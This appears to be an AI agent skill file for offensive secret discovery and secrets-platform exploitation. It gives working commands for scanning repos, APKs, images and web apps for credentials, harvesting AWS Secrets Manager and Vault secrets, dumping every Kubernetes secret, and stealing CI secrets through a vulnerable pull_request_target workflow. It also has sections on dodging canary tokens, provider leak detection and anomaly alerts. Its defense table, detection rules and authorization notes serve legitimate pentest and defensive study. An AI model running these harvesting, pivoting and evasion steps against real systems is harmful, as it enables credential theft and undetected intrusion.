---
name: secret-management-attack
description: Secret discovery, SAST code audit, and secrets-management platform attack covering gitleaks, semgrep, trufflehog, infisical, bearer, DeepAudit, apkleaks, and cariddi — including HashiCorp Vault exploitation (auth methods, secrets engines, policies, response-wrap hijacking, SSRF), AWS KMS key policy abuse, GCP KMS IAM escalation, Azure Key Vault access policy review, BYOK/HYOK attacks, Kyverno/external-secrets/secrets-store-csi-driver misconfig hunting, hardcoded credential discovery, secret rotation abuse, and CI/CD pipeline secret theft.
origin: github-trending-2026
version: "0.2.0.2"
compatibility: ">=0.1.29"
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - Glob
  - Grep
  - WebFetch
metadata:
  domain: appsec
  tool_count: 14
  guide_count: 3
  mitre: "T1552-Unsecured Credentials, T1552.001-Credentials In Files, T1552.004-Private Keys, T1552.007-Container and Cloud"
  last_reviewed: "2026-07-26"
---




# Skill: Secret Management Attack — Discovery, SAST Audit & Vault Exploitation

> **Supplementary Files**:
> - `payloads.md` — gitleaks / trufflehog / semgrep / bearer command catalogs, AWS-GCP-Azure metadata secret extraction, HashiCorp Vault token-theft payloads, Infisical/Doppler/AWS Secrets Manager abuse, GitHub Actions/GitLab CI/Jenkins secret exfiltration, Kubernetes secret + etcd dump, container image layer analysis (dive/trivy), DeepAudit multi-agent audit invocation, apkleaks DEX scanning, cariddi web crawl, custom regex patterns for proprietary tokens, OPSEC-aware scanning techniques, canary-token evasion
> - `test-cases.md` — Structured test cases TC-SM-001 through TC-SM-018 covering repo history sweep, filesystem secret scan, SAST custom rules, APK secret extraction, vault token abuse, cloud metadata theft, CI/CD secret dump, K8s secret dump, container layer analysis, secret verification workflow, canary-token detection, full lifecycle audit, Terraform state extraction, CI/CD multi-provider inventory enumeration, custom gitleaks ruleset precision/recall validation, semgrep taint-mode secret-to-sink rules, Jenkins credentials binding audit, and GitHub Actions `pull_request_target` workflow audit
> - `guides/secret-management-attack-playbook.md` — End-to-end playbook walking from scope definition through repo scan, SAST triage, vault/cloud/CI exploitation, lateral pivoting, and OPSEC-safe report assembly
> - `guides/vault-and-cloud-kms-attack-playbook.md` — HashiCorp Vault and cloud KMS attack deep dive (Vault auth methods, secrets engines, policies, response-wrap hijacking and SSRF; AWS KMS key policy abuse, grant abuse, deletion ransomware; GCP KMS IAM escalation and Cloud EKM; Azure Key Vault access policy review and managed identity abuse; BYOK/HYOK attacks; Kyverno, external-secrets, secrets-store-csi-driver misconfig hunting; cross-platform discovery patterns)
> - `guides/cicd-secret-sprawl-and-sast-rule-deep-dive.md` — CI/CD secret sprawl audit and custom SAST rule authoring deep dive (GitHub Actions, GitLab CI, Jenkins, CircleCI, Argo CD, Tekton, Terraform Cloud inventory; Terraform state file secret extraction; gitleaks / semgrep / bearer custom rule authoring; precision/recall validation methodology; OPSEC for CI/CD audit; CI/CD sprawl heat map report assembly)

## Summary

Secret Management Attack skill domain covering secrets discovery, SAST (Static Application Security Testing) code audit, and secrets-management platform exploitation.

**Tools**: gitleaks, trufflehog, semgrep, bearer, DeepAudit, apkleaks, cariddi, dive, trivy, grype, HashiCorp Vault CLI, Infisical CLI, AWS Secrets Manager SDK, kubectl (+4)

**Domain**: appsec

**MITRE ATT&CK**: T1552-Unsecured Credentials, T1552.001-Credentials In Files, T1552.004-Private Keys, T1552.007-Container and Cloud

## Description

Secret management attack covers the full lifecycle of credential exposure: discovering hardcoded secrets in source code and git history (gitleaks, trufflehog), running static analysis to find insecure data flows that leak secrets (semgrep, bearer, DeepAudit), extracting secrets from compiled artifacts and mobile bundles (apkleaks, trufflehog filesystem), crawling live web endpoints for embedded tokens (cariddi), exploiting secrets-management platforms once a foothold is obtained (HashiCorp Vault, Infisical, Doppler, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault), stealing CI/CD pipeline secrets (GitHub Actions, GitLab CI, Jenkins, CircleCI), dumping Kubernetes secrets and etcd contents, and peeling container image layers to find credentials baked into base images.

This is **not** generic security-review. The distinction matters because secrets are the single highest-leverage finding in a real engagement: one leaked AWS access key grants production infrastructure; one stale Vault token grants every secret an entire service can read; one CI variable carries deploy credentials across hundreds of environments. The discipline is therefore focused on **breadth first, depth second**: scan everything (repo, history, filesystem, images, live endpoints, cloud metadata, runtime memory) before going deep on verification and exploitation. Every finding carries an OPSEC obligation — naïve verification against live services triggers provider-side secret-leak monitoring (GitHub Secret Scanning, GitGuardian, AWS CloudTrail anomalies), invalidates canary tokens, and tips the defender before lateral movement is ready.

**Difference from `security-review`**: security-review is a checklist (did you check X, Y, Z?). Secret-management-attack is the deep dive — it provides the actual command inventory, OPSEC-aware verification patterns, vault/platform exploitation paths, and the verification loop that distinguishes a stale-looking string in a README from a live, exploitable production key.

**Difference from `repo-scan`**: repo-scan classifies the codebase (what's custom, what's third-party). Secret-management-attack consumes that classification, ignores the third-party code unless specifically asked, and concentrates on the custom-code surface where secrets live — and then extends beyond the repo into the runtime (cloud, vault, CI, containers) where those secrets actually authenticate.

**Difference from `cloud-security`**: cloud-security covers IAM policy, networking, and workload identity. Secret-management-attack focuses specifically on the credential itself — where it leaked, whether it still works, what permissions it carries, and how to use it without tripping the cloud provider's anomaly detectors. The two skills are complementary: cloud-security tells you "this role can read all S3 buckets"; secret-management-attack tells you "here is the access key for that role, found in a 3-year-old commit."

**Difference from `post-exploitation`**: post-exploitation covers host takeover after a foothold. Secret-management-attack is the discovery phase that often produces the foothold — credentials harvested from a repo or image are the most common entry vector in real breaches (Codecov, CircleCI, LastPass, Toyota, Samsung).

## Use Cases

- **Repository history secret sweep**: Run gitleaks + trufflehog across the entire git history (including all branches, tags, and dangling commits) to find secrets that were committed and "deleted" but remain recoverable from the reflog or pack files. Cover the OPSEC concern: scanning locally cloned repos avoids triggering GitHub Secret Scanning alerts that fire on push.
- **SAST custom-rules audit**: Author semgrep + bearer rules that match the client's proprietary token formats, internal API key prefixes, and bespoke auth schemes that off-the-shelf scanners miss. Combine with registry rules (semgrep-rules, bearer-rules) for standard framework coverage.
- **Hardcoded-credential filesystem sweep**: Walk a filesystem (server, container, laptop) and identify `.env`, `config.yml`, `~/.aws/credentials`, `~/.kube/config`, `~/.docker/config.json`, `~/.npmrc`, `~/.pypirc`, application log files, IDE workspace state, and shell history for plaintext credentials.
- **Mobile app secret extraction**: Run apkleaks and trufflehog against APK/DEX files to extract embedded API keys, Firebase config, OAuth client secrets, and hardcoded backend URLs that mobile developers left in the binary.
- **Web endpoint + JS crawl**: Use cariddi to crawl a target web app, extract inline secrets from JavaScript bundles, sourcemaps, and HTML comments, and identify forgotten debug endpoints leaking tokens.
- **HashiCorp Vault exploitation**: From a foothold on a host with a Vault agent sidecar, abuse the VAULT_TOKEN environment variable, probe token capabilities via `vault token capabilities`, attempt policy escalation, and read every secret the token can reach — all without revoking the token (preserves OPSEC).
- **Cloud secret-manager exploitation**: Enumerate and read AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Doppler/Infisical secrets using compromised credentials — focusing on the "blast radius" question (what does THIS credential let me read?).
- **CI/CD pipeline secret theft**: Dump GitHub Actions secrets via `pull_request_target` abuse, GitLab CI masked-variable exposure via `script` echoes, Jenkins credentials binding leakage, and CircleCI context env-var exfiltration. Reference real CVEs: Codecov bash uploader supply-chain (CVE-2021-N/A), CircleCI orb leak (2023), GitHub Actions `tj-actions/changed-files` compromise (2025).
- **Kubernetes secret dump**: List and dump all secrets in all namespaces a service account can reach; pivot to etcd if the SA has the right RBAC; harvest imagePullSecrets for private registry credentials.
- **Container image layer analysis**: Use `dive` to walk each layer of a Docker image, find `.env` or config files baked into a layer even if later deleted, and run `trivy` / `grype` against the image for both vulnerabilities and embedded secrets.

## Core Tools

### Secret Scanners

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **gitleaks** (27k★) | Git history + filesystem secret detection with 100+ built-in rules | `gitleaks detect --source . --report-path leaks.json` |
| **trufflehog** | Deep secret scanning with live verification (does the key still work?) | `trufflehog git file://. --only-verified --json` |
| **semgrep** (15k★) | SAST with custom rule DSL — supports both security patterns and secret discovery | `semgrep --config p/secret-detection --config custom.yml .` |
| **bearer** (2.7k★) | Data-flow-aware SAST — tracks secret flow from source to sink | `bearer scan --dataflow .` |
| **DeepAudit** (6.4k★) | Multi-agent AI audit that orchestrates the above tools | `deepaudit run --target ./repo` |

### Mobile / Web / Binary

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **apkleaks** (6k★) | APK/DEX secret extraction with regex patterns for 80+ providers | `apkleaks -f app.apk -o secrets.txt` |
| **cariddi** (3.4k★) | Web crawler that extracts endpoints, secrets, and params from JS | `cariddi -u https://target -e -s` |

### Container & Cloud

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **dive** | Layer-by-layer Docker image inspection | `dive image:tag` |
| **trivy** | Image / filesystem / repo scanner — vulns + secrets | `trivy image --scanners secret image:tag` |
| **grype** | Vulnerability + secret matching against SBOM | `grype image:tag` |

### Secrets-Management Platforms

| Tool / Platform | Purpose | Command Example |
|-----------------|---------|-----------------|
| **HashiCorp Vault CLI** | Token introspection, secret read, policy abuse | `vault token capabilities $(printenv VAULT_TOKEN)` |
| **Infisical CLI** | Project / environment secret enumeration | `infisical secrets --token=<st> --env=prod` |
| **Doppler CLI** | Config + secret read from compromised token | `doppler secrets --token st.xxx.dp` |
| **AWS Secrets Manager** | Cloud secret enumeration + read | `aws secretsmanager list-secrets --region us-east-1` |
| **GCP Secret Manager** | Cloud secret enumeration + read | `gcloud secrets list && gcloud secrets versions access latest --secret=X` |
| **Azure Key Vault** | Certificate / key / secret enumeration | `az keyvault secret list --vault-name <vault>` |
| **kubectl** | Kubernetes secret enumeration + decode | `kubectl get secrets -A -o yaml` |

## Methodology

### Secret Attack Six-Phase Process

```
Phase 1            Phase 2            Phase 3            Phase 4            Phase 5            Phase 6
Scope &            Breadth            Triage &           Platform           Lateral            Report &
Inventory      →   Scan          →   Verify        →    Exploit       →    Pivot         →    Rotated-Keys Map
   │                  │                  │                  │                  │                  │
   ▼                  ▼                  ▼                  ▼                  ▼                  ▼
Define targets,    gitleaks +         Trufflehog verify,  Vault / cloud /   Use stolen creds   Map every
exclusions,        trufflehog +       canary-token       CI / K8s /        to pivot: cloud    verified secret
OPSEC limits,      semgrep + bearer + detection,         container          auth → secrets →   to its blast
scan budget        apkleaks +          dedupe, severity   exploitation      more clouds         radius + rotation
                   cariddi             ranking
```

**Phase 1: Scope & Inventory**

Before any scanning, define what is in scope and what is **not**. This phase sets OPSEC limits (no live verification against production APIs, no triggering of secret-leak monitoring), determines scan budget (a monorepo with 10 years of history needs a different approach than a single-container audit), and produces an inventory of targets: repos, hosts, images, mobile binaries, web apps, cloud accounts, vaults.

```bash
# Inventory template
cat <<EOF > secret_targets.tsv
kind        location                            notes
repo        github.com/client/monorepo          full history + all branches
host        10.0.1.5 (bastion)                  /home, /etc, /var/log
image       registry/client/api:2024.11         all layers
apk         com.client.app (Play Store)         production binary
webapp      https://app.client.com              crawl + JS extraction
cloud       aws:123456789012                    IAM + Secrets Manager
vault       https://vault.infra.client.local    token from sidecar leak
ci          github.com/client/monorepo-actions  workflows + secrets
k8s         https://k8s.api.client.local        all namespaces
EOF
```

**Phase 2: Breadth Scan**

Run every applicable scanner against every target. The goal is **breadth, not depth** — find every candidate, do not yet verify. Verification happens in Phase 3 because every live verification is an OPSEC event.

```bash
# Repo history (local clone only — do NOT use --remote on production repos during recon)
gitleaks detect --source . --report-path gitleaks_repo.json --log-opts=" --all"
trufflehog git file://. --no-update --json --only-results > trufflehog_repo.jsonl

# Filesystem (host compromise)
gitleaks detect --source /target --no-git --report-path gitleaks_fs.json
trufflehog filesystem /target --json > trufflehog_fs.jsonl

# SAST custom rules (proprietary token formats)
semgrep --config p/secret-detection --config custom_secrets.yml . --json -o semgrep.json

# APK
apkleaks -f app.apk -o apkleaks.txt

# Web crawl
cariddi -u https://target -e -s -ot 5 > cariddi.txt

# Image layers
dive image:tag --ci-config .dive.yaml
trivy image --scanners secret --format json image:tag -o trivy_image.json
```

**Phase 3: Triage & Verify**

Dedupe findings, filter false positives (test keys, canary tokens, example strings from docs), rank by apparent blast radius (an `AKIA...` key is higher priority than an internal API token of unknown scope), and **verify** — but only after explicitly confirming OPSEC allowance. Trufflehog's `--only-verified` flag performs live verification; this is powerful but generates real API calls.

```bash
# Verify AWS keys (writes to CloudTrail — OPSEC event)
trufflehog --only-verified git file://. --json

# Manual AWS verification (minimal signature)
# See payloads.md Section 8.1 — the lightest-touch check is STS GetCallerIdentity

# Verify GitHub PAT (no log side-effect if only hitting /user)
curl -s -H "Authorization: token $TOKEN" https://api.github.com/user | jq .login

# Canary-token detection BEFORE verification — see payloads.md Section 14
# (thinkst canarytokens.org, GitGuardian honeytokens, custom AWS honey keys)
```

**Phase 4: Platform Exploit**

Once a credential is verified, expand to its native platform. An AWS key becomes a Secrets Manager enumeration. A Vault token becomes a secret read across all reachable paths. A CI variable becomes lateral movement into other pipelines.

```bash
# AWS — enumerate secrets the compromised key can read
aws secretsmanager list-secrets --region us-east-1 --output json
aws secretsmanager get-secret-value --secret-id prod/db --region us-east-1

# Vault — list capabilities and read every reachable path
vault token capabilities $(printenv VAULT_TOKEN)
vault kv get -format=json secret/prod/db | jq .data.data

# Infisical — enumerate all secrets in all environments the token reaches
infisical secrets --token st.xxx.prod.proj --env=prod --path /
```

**Phase 5: Lateral Pivot**

Use harvested secrets to reach new targets. A database password from Secrets Manager authenticates to the RDS instance. A Vault token from a CI runner authenticates to production infrastructure. A `kubeconfig` from a desktop machine grants cluster-admin somewhere.

The discipline here is **graph traversal**: each secret expands the reachable-node set. Maintain a running pivot-graph so that by Phase 6 you can articulate the full blast radius.

**Phase 6: Report & Rotated-Keys Map**

Produce a deliverable that maps every verified secret to: where it was found, who owns it, what it grants, whether it has been rotated, and what compensating controls are now in place. The most valuable section is the **blast-radius graph** — a single diagram showing "this one leaked Vault token → these 47 secrets → these 12 services."

### Quick Selection Guide

| Scenario | Primary Approach | Alternative |
|----------|------------------|-------------|
| New client, monorepo, full history | `gitleaks` + `trufflehog git` on local clone | Add `--log-opts="--since=2020-01-01"` to budget |
| Suspected secret in 3rd-party image | `dive` to find layer, `trivy image --scanners secret` | Pull and grep on extracted FS |
| Mobile app pentest | `apkleaks` + `trufflehog filesystem` on extracted APK | `jadx` then manual review |
| Web app recon | `cariddi` crawl + JS extraction | `katana` + custom grep |
| Foothold on host with Vault sidecar | `vault token capabilities`, enumerate paths | Dump `VAULT_TOKEN` from process env |
| Compromised AWS key | STS GetCallerIdentity → enumerate Secrets Manager | Check IAM policies for S3/RDS read |
| GitHub Actions recon | Read workflow YAMLs, identify `pull_request_target` | Trigger fork-PR workflow in test repo |
| K8s SA foothold | `kubectl get secrets -A -o yaml`, decode base64 | If RBAC allows, query etcd directly |
| Verifying without OPSEC impact | Local entropy + regex + context check | Use trufflehog with `--no-verification` |
| Suspected canary token | Heuristic check (see payloads.md §14) before any API call | Treat unknown AWS keys as honeytokens until proven |
| Hand to executive | Blast-radius graph + rotation status table | Add timeline of when each secret was committed |

### Defense Perspective

| Defense Measure | Description |
|-----------------|-------------|
| **Pre-commit hooks (gitleaks/talisman)** | Block secrets before they ever reach git history. `pre-commit` + gitleaks is the highest-ROI control. |
| **CI/CD scanning** | Run trufflehog + gitleaks in every PR build; fail the build on new findings. |
| **Short-lived credentials** | Replace long-lived AWS keys with STS sessions; replace Vault static tokens with AppRole / Kubernetes auth; replace CI long-lived tokens with OIDC federation. |
| **Vault policy least privilege** | Each service's Vault policy should grant only the specific secret paths it needs — never `secret/*`. |
| **Secret rotation discipline** | Rotate on schedule AND on personnel change; track rotation state per secret. |
| **Canary tokens / honeytokens** | Deploy fake AWS keys (thinkst, GitGuardian) in repos and configs; alert on use. |
| **Runtime secret scanning** | Trivy on every image push; Falco rules for secrets read from env at runtime. |
| **Provider-side leak detection** | GitHub Secret Scanning, GitGuardian, AWS's own "leaked credential" CloudTrail detector — enable all that apply. |
| **Short TTL on Vault tokens** | Default 24h, renewable; never issue permanent tokens. |
| **Audit logging on every secret read** | Vault audit devices, AWS CloudTrail data events on Secrets Manager, GCP Audit Logs — log every read; alert on anomalous read patterns. |

## Practical Steps

> **Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`.**

### Exercise 1: Repository History Sweep (Local-Only OPSEC)

Goal: find every secret in git history without triggering provider-side alerting.

```bash
# Clone locally (do NOT use --remote scan during recon)
git clone --mirror https://github.com/client/repo.git repo-bare

# gitleaks — all branches, all tags, all commits
gitleaks detect --source repo-bare --report-path gitleaks.json \
  --log-opts=" --all" --verbose

# trufflehog — start with --no-verification to avoid live API calls
trufflehog git file://repo-bare --no-update --no-verification --json \
  > trufflehog_unverified.jsonl

# After manual review, verify ONLY the high-confidence candidates
trufflehog git file://repo-bare --only-verified --json \
  --results=verified,unknown --include-detectors=aws,github,stripe \
  > trufflehog_verified.jsonl
```

### Exercise 2: SAST Custom Rule for Proprietary Tokens

Goal: write a semgrep rule that matches the client's internal token format and discover leakage.

```yaml
# custom_secrets.yml
rules:
  - id: client-internal-api-key
    patterns:
      - pattern-regex: 'client_api_key\s*[:=]\s*["'']?[A-Za-z0-9]{40}["'']?'
      - pattern-not-regex: 'example|test|fake|YOUR_KEY'
    message: Client internal API key detected
    languages: [generic]
    severity: ERROR
    metadata:
      classification: secret
      rotation_owner: security-team@
```

```bash
semgrep --config custom_secrets.yml . --json -o findings.json
```

### Exercise 3: HashiCorp Vault Token Capabilities Abuse

Goal: from a foothold with a Vault sidecar token, enumerate every reachable secret without revoking the token.

```bash
# 1. Token introspection
vault token lookup

# 2. Capabilities on the most common paths
for path in secret/ secret/data/ prod/ staging/ kv/; do
  echo "=== $path ==="
  vault token capabilities "$path" || true
done

# 3. Recursive list-and-read of every reachable path
# (See payloads.md Section 9.2 for the recursive walker script)

# 4. OPSEC: do NOT revoke the token until ready — read-only preserves stealth
```

### Exercise 4: AWS Secrets Manager Blast-Radius Enumeration

Goal: from a verified AWS key, map every secret it can read.

```bash
# 1. Verify the key (lightest-touch call)
aws sts get-caller-identity

# 2. List all secrets in every region the account uses
for region in us-east-1 us-west-2 eu-west-1 ap-southeast-2; do
  aws secretsmanager list-secrets --region "$region" --output json > "secrets_${region}.json"
done

# 3. Bulk-read each secret (CloudTrail logs every read — OPSEC event)
for arn in $(jq -r '.SecretList[].ARN' secrets_us-east-1.json); do
  aws secretsmanager get-secret-value --secret-id "$arn" --region us-east-1 \
    --query 'SecretString' --output text >> harvested.jsonl
done
```

### Exercise 5: GitHub Actions Secret Theft via `pull_request_target`

Goal: demonstrate how a misconfigured workflow exposes repository secrets to fork-PR attackers.

```yaml
# .github/workflows/integration.yml (VULNERABLE)
name: integration
on:
  pull_request_target:
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out attacker PR
      - run: npm install                                  # runs attacker package.json
      - run: npm test
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}        # secret exposed to attacker code
```

Attack: an attacker forks the repo, modifies `package.json` to exfiltrate `process.env.DEPLOY_TOKEN`, opens a PR. See `payloads.md` Section 11 for the full exfil payload and remediation (never use `pull_request_target` with `secrets.*` and an attacker-controlled ref).

### Exercise 6: Kubernetes Secret Dump

Goal: dump every secret the compromised service account can reach.

```bash
# 1. Identify SA
kubectl auth can-i --list

# 2. Dump all secrets across all namespaces
kubectl get secrets -A -o json | jq '.items[] |
  {ns: .metadata.namespace,
   name: .metadata.name,
   type: .type,
   data: (.data | to_entries | map({key:.key, val:(.value|@base64d)}))}'

# 3. ImagePullSecrets — registry creds for lateral to private registries
kubectl get secrets -A -o json | jq '.items[] | select(.type=="kubernetes.io/dockerconfigjson") |
  {ns:.metadata.namespace, name:.metadata.name,
   auths: (.data[".dockerconfigjson"]|@base64d|fromjson).auths}'

# 4. If RBAC allows, query etcd directly (see payloads.md Section 12)
```

### Exercise 7: Container Image Layer Analysis

Goal: find a secret that was baked into a base layer and "deleted" in a later layer.

```bash
# dive — interactive layer walk
dive registry.client/api:2024.11

# trivy — secret scanner
trivy image --scanners secret --format json registry.client/api:2024.11 \
  -o trivy_findings.json

# Manual: save image, walk filesystem
docker save registry.client/api:2024.11 -o image.tar
mkdir image && tar xf image.tar -C image
find image -name "*.env" -o -name "config*.yml" -o -name "credentials*" | \
  xargs grep -lE "(AKIA|sk-|ghp_|xox[bao]"
```

### Exercise 8: APK Secret Extraction

Goal: extract every secret from a production Android APK.

```bash
# apkleaks — runs regex rules across the APK
apkleaks -f app.apk -o apkleaks.txt

# trufflehog — filesystem scan on extracted APK
unzip -p app.apk classes.dex > classes.dex
trufflehog filesystem --json . > apk_truffle.jsonl

# Manual — jadx then grep
jadx -d app_src app.apk
grep -rE "AKIA[0-9A-Z]{16}|sk_live_|gh[pousr]_|xox[bao]-" app_src/
```

### Exercise 9: Web App JS Secret Crawl

Goal: extract secrets from a web app's JavaScript bundles.

```bash
# cariddi — crawler + secret extractor
cariddi -u https://app.client.com -e -s -ot 5 -timeout 10

# Manual — download all JS, grep
katana -u https://app.client.com -jc -d 3 | grep -E "\.js$" | \
  xargs -I{} sh -c 'curl -s "{}" >> js_bundle.js'

# Extract secrets with regex
grep -oE "(AKIA[0-9A-Z]{16}|sk_live_[A-Za-z0-9]{24}|ghp_[A-Za-z0-9]{36}|AIza[0-9A-Za-z_\-]{35})" js_bundle.js

# Also: check sourcemaps for original source paths
curl -s https://app.client.com/bundle.js.map | jq .sources
```

### Exercise 10: Full Lifecycle Audit & Report

Goal: assemble a blast-radius graph and rotation-status table.

```markdown
# Secret Audit Report — Client Corp

## Summary
- Total candidate secrets found: 312
- Verified live: 47
- Highest blast radius: 1 Vault token → 184 production secrets

## Blast-Radius Graph
[diagram showing the chain of leaked credential → platform → secrets → services]

## Rotation Status Table
| Secret | Found In | Verified | Owner | Last Rotated | Status |
|--------|----------|----------|-------|--------------|--------|
| AWS AKIA... | git commit 4yr old | yes | infra-team | 2 days ago | rotated |
| Vault s.xxxx | CI runner env | yes | platform-team | pending | NOT ROTATED |
| Stripe sk_live_ | mobile APK | yes | payments-team | 1 day ago | rotated |
```

## Detection Methods

### Secret Manager Audit
- **AWS Secrets Manager**: `GetSecretValue` spike; cross-service secret access.
- **HashiCorp Vault**: Vault audit log; new auth method added; token creation anomalies.
- **Azure Key Vault**: Key vault access from new identity; bulk secret reads.

### SIEM Detection Rules
- **Splunk SPL**: `index=secrets | stats count by identity | where count > 100`
- **Vault audit**: Native Vault audit device; SIEM integration.
- **AWS CloudTrail**: Alert on `secretsmanager:GetSecretValue` from new ARN.

## Defense Evasion Techniques

### Secret Theft Stealth
- **Use legitimate service identity**: Don't create new identity; use existing service account.
- **Off-hours access**: Access secrets during low-activity hours.
- **Distribute reads**: Spread reads across time; below baseline anomaly.

### Vault Compromise Stealth
- **Use existing auth methods**: Don't create new auth method; use existing one.
- **Use orphan tokens**: Some Vault tokens have no TTL; reuse indefinitely.
- **Response wrapping abuse**: Use wrapping tokens to exfil secrets in transit.

## Safety Notes

- **Authorization is non-negotiable**: scanning a codebase you do not own, verifying a credential against a live API you do not have rights to, or reading a Vault you have not been granted access to are all crimes in most jurisdictions. The Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalents elsewhere apply.
- **OPSEC from the first scan**: scanning a **remote** repo with trufflehog or gitleaks can trigger GitHub/GitLab's own secret-scanning alerts. Clone locally and scan the filesystem instead. The provider cannot see what happens on your laptop.
- **Verification is an event**: every time trufflehog's `--only-verified` calls an AWS STS endpoint, a CloudTrail event fires. AWS has a dedicated detector for leaked keys. Verify sparingly and only with explicit client authorization.
- **Canary tokens are everywhere**: thinkst canarytokens, GitGuardian honeytokens, and custom AWS honey keys are deployed in repos and configs specifically to catch scanners. Treat every unknown AWS key as a potential honeytoken until you have done the heuristic check in `payloads.md` Section 14.
- **Never commit to remediation before notifying**: if you find a live production key, the right move is to alert the owner immediately for rotation, not to "test what else it can do." Lateral exploration after notification is fine; before notification is reckless.
- **Secrets in test artifacts are still secrets**: a `sk_test_...` Stripe key or a `ghp_test_...` GitHub PAT may have lower blast radius but is still a credential. Document and rotate.
- **Don't exfiltrate more than necessary**: harvesting 1000 secrets when you need to demonstrate 5 is overreach and creates a breach-of-NDA risk. Scope the harvest to the minimum necessary for the engagement.
- **Report assembly discipline**: never include the full secret value in the report deliverable. Use masked forms (`AKIA...XYZ9`) — enough to identify, not enough to weaponize if the report leaks.

## Hacker Laws

- **Information Wants to Be Free** — secrets are fundamentally information; they leak through git history, image layers, mobile binaries, JS bundles, log files, env vars, and memory. The defensive posture must assume eventual exposure and design for blast-radius containment (short TTLs, least-privilege policies, rotation discipline).
- **Assume Breach** — given a foothold on any one host, ask: what secrets can this host read? Vault sidecars leak VAULT_TOKEN. AWS instances leak instance-profile credentials via the metadata endpoint. CI runners leak secrets in env. Every host is a potential secret-store; map the blast radius before the adversary does.
- **Least Privilege** — the single most effective secret-defense control. A Vault token scoped to `secret/prod/webapp/db` is recoverable; a token scoped to `secret/*` is catastrophic. Every policy review should ask: can this be narrower?
- **Trust but Verify** — trufflehog's verification is not optional theater; it is the difference between "found a string that looks like a key" and "found a key that grants production access." A finding without verification is a hypothesis, not a finding.
- **Defense in Depth** — pre-commit hooks catch 80% of leaks; CI scanning catches the next 15%; runtime scanning catches the last 5% that escape both. No single layer is sufficient; the layering is the control.
- **People are the Weakest Link** — secrets leak because developers commit them, paste them into Slack, email them to vendors, and embed them in screenshots. Tooling helps; the durable fix is cultural: secret-handling hygiene as a default expectation, not an afterthought.

## Cross-References

- **`skills/security-review/SKILL.md`** — the checklist framework this skill extends with deep secrets/SAST coverage
- **`skills/repo-scan/SKILL.md`** — codebase classification that informs which surfaces to scan
- **`skills/cloud-security/SKILL.md`** — IAM and workload identity (this skill finds the keys; cloud-security explains what those keys can do)
- **`skills/container-security/SKILL.md`** — runtime container protection; complements this skill's image-layer analysis
- **`skills/post-exploitation/SKILL.md`** — host-takeover patterns; secret-management-attack often supplies the initial access that post-exploitation extends
- **`skills/anti-forensics/SKILL.md`** — relevant when considering how defenders will reconstruct a breach timeline
- **`skills/digital-forensics/SKILL.md`** — the defensive counterpart; the same artifact set (git history, image layers, K8s secrets) is what an investigator will examine
- **`skills/supply-chain-security/SKILL.md`** — overlaps with this skill on CI/CD secret theft and Codecov/CircleCI-class incidents
- **`skills/web-auth-bypass/SKILL.md`** — relevant when harvested tokens are JWT/OAuth/session credentials
- **`skills/pentest-reporting/SKILL.md`** — report assembly with the masked-secret discipline required for secret-audit deliverables

## Learning Resources

- **This skill's supplementary files**: `payloads.md`, `test-cases.md`
- **Deep-dive guides**:
  - `guides/secret-management-attack-playbook.md` — end-to-end workflow from scope through scan, triage, platform exploit, lateral pivot, and report
  - `guides/vault-and-cloud-kms-attack-playbook.md` — Vault and cloud KMS exploitation depth
  - `guides/cicd-secret-sprawl-and-sast-rule-deep-dive.md` — CI/CD sprawl audit and custom SAST rule authoring
- **Tool homes**:
  - gitleaks: [github.com/gitleaks/gitleaks](https://github.com/gitleaks/gitleaks) (27k★)
  - trufflehog: [github.com/trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog)
  - semgrep: [github.com/semgrep/semgrep](https://github.com/semgrep/semgrep) (15k★)
  - bearer: [github.com/Bearer/bearer](https://github.com/Bearer/bearer) (2.7k★)
  - DeepAudit: [github.com/YiPaOiYe/DeepAudit](https://github.com/YiPaOiYe/DeepAudit) (6.4k★)
  - apkleaks: [github.com/dwisiswant0/apkleaks](https://github.com/dwisiswant0/apkleaks) (6k★)
  - cariddi: [github.com/edoardottt/cariddi](https://github.com/edoardottt/cariddi) (3.4k★)
  - infisical: [github.com/Infisical/infisical](https://github.com/Infisical/infisical) (27k★)
  - dive: [github.com/wagoodman/dive](https://github.com/wagoodman/dive)
  - trivy: [github.com/aquasecurity/trivy](https://github.com/aquasecurity/trivy)
  - grype: [github.com/anchore/grype](https://github.com/anchore/grype)
- **Real-world references**:
  - Codecov supply chain (2021): [codecov.io/security-update](https://about.codecov.io/security-update/)
  - CircleCI secret leak (2023): [circleci.com/blog](https://circleci.com/blog/)
  - LastPass source-code theft (2022)
  - GitHub Actions `tj-actions/changed-files` compromise (2025)
  - HashiCorp Vault security advisories: [vault.security advisories](https://discuss.hashicorp.com/c/security-advisories/38)
- **Cloud provider docs**:
  - AWS Secrets Manager: [docs.aws.amazon.com/secretsmanager](https://docs.aws.amazon.com/secretsmanager/)
  - GCP Secret Manager: [cloud.google.com/secret-manager](https://cloud.google.com/secret-manager)
  - Azure Key Vault: [learn.microsoft.com/azure/key-vault](https://learn.microsoft.com/azure/key-vault/)
  - HashiCorp Vault: [developer.hashicorp.com/vault](https://developer.hashicorp.com/vault)
- **Core system files**: `SOUL.md`, `TOOLS.md`, `IDENTITY.md`
